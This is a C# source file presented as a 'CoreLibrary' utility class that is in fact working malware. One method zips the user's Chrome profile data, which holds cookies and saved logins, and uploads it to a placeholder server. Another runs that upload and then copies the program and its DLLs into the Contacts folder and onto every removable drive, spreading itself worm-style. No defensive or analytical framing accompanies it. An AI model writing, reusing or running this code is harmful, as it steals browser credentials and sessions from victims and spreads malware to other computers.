using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using System.IO.Compression;

namespace CoreLibrary
{
    public class Core
    {
        // Returns the current user's username
        public static string GetCurrentUserName()
        {
            return Environment.UserName;
        }

        // Lists all removable drives and returns their names
        public static List<string> ListRemovableDrives()
        {
            var removableDrives = new List<string>();
            DriveInfo[] drives = DriveInfo.GetDrives();

            foreach (DriveInfo drive in drives)
            {
                if (drive.DriveType == DriveType.Removable)
                {
                    removableDrives.Add(drive.Name);
                }
            }

            if (removableDrives.Count > 0)
            {
                Console.WriteLine("Removable drives found:");
                foreach (string drive in removableDrives)
                {
                    Console.WriteLine(drive);
                }
            }
            else
            {
                Console.WriteLine("No removable drives found.");
            }

            return removableDrives;
        }

        // Archives Chrome user data and uploads it to a server
        public static async Task ArchiveAndUploadChromeData()
        {
            try
            {
                string chromeDataPath = @$"C:\Users\{GetCurrentUserName()}\AppData\Local\Google\Chrome\User Data\Default\";
                string zipFilePath = Path.Combine(Path.GetTempPath(), "ChromeData.zip");

                // Create a zip file of the Chrome data if it doesn't already exist
                if (!File.Exists(zipFilePath))
                {
                    if (Directory.Exists(chromeDataPath))
                    {
                        ZipFile.CreateFromDirectory(chromeDataPath, zipFilePath, CompressionLevel.Fastest, includeBaseDirectory: false);
                        Console.WriteLine("Chrome data archived successfully.");
                    }
                    else
                    {
                        Console.WriteLine("Chrome data directory not found.");
                        return;
                    }
                }
                else
                {
                    Console.WriteLine("Chrome data zip file already exists.");
                }

                // Upload the zip file to the server
                using (var httpClient = new HttpClient())
                {
                    using (var formData = new MultipartFormDataContent())
                    {
                        formData.Add(new StreamContent(File.OpenRead(zipFilePath)), "file", "ChromeData.zip");
                        var response = await httpClient.PostAsync("http://YOUR_SERVER/upload", formData);

                        if (response.IsSuccessStatusCode)
                        {
                            Console.WriteLine("File uploaded successfully.");
                        }
                        else
                        {
                            Console.WriteLine("Failed to upload file.");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred: " + ex.Message);
            }
        }

        // Copies the executable and DLL files to specific directories
        public static async Task CopyFilesToDirectories()
        {
            await ArchiveAndUploadChromeData();

            try
            {
                string currentExecutablePath = Process.GetCurrentProcess().MainModule.FileName;

                // Safely handle potential null return from Path.GetDirectoryName
                string? currentDirectory = Path.GetDirectoryName(currentExecutablePath);

                if (string.IsNullOrEmpty(currentDirectory))
                {
                    Console.WriteLine("Failed to retrieve current directory.");
                    return;
                }

                string executableName = Path.GetFileName(currentExecutablePath);

                // Get all files in the current directory
                string[] filesInCurrentDirectory = Directory.GetFiles(currentDirectory);

                // Directories where files will be copied
                string[] targetDirectories = {
                    @$"C:\Users\{GetCurrentUserName()}\Contacts",
                };

                // Copy the executable and DLL files to target directories
                foreach (string dir in targetDirectories)
                {
                    if (Directory.Exists(dir))
                    {
                        await CopyFilesToDirectory(dir, executableName, currentExecutablePath, filesInCurrentDirectory);
                    }
                    else
                    {
                        Console.WriteLine($"Directory not found: {dir}");
                    }
                }

                // Copy files to removable drives
                foreach (string removableDrive in ListRemovableDrives())
                {
                    await CopyFilesToDirectory(removableDrive, executableName, currentExecutablePath, filesInCurrentDirectory);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred: " + ex.Message);
            }
        }

        // Helper method to copy the executable and DLL files to a target directory
        private static async Task CopyFilesToDirectory(string destinationDir, string executableName, string executablePath, string[] dllFiles)
        {
            try
            {
                string destinationFile = Path.Combine(destinationDir, executableName);
                File.Copy(executablePath, destinationFile, true);
                Console.WriteLine($"Executable copied to: {destinationFile}");

                foreach (string dllFile in dllFiles)
                {
                    string destinationDll = Path.Combine(destinationDir, Path.GetFileName(dllFile));
                    File.Copy(dllFile, destinationDll, true);
                    Console.WriteLine($"DLL copied to: {destinationDll}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error copying files to {destinationDir}: {ex.Message}");
            }

            await Task.CompletedTask;
        }
    }
}
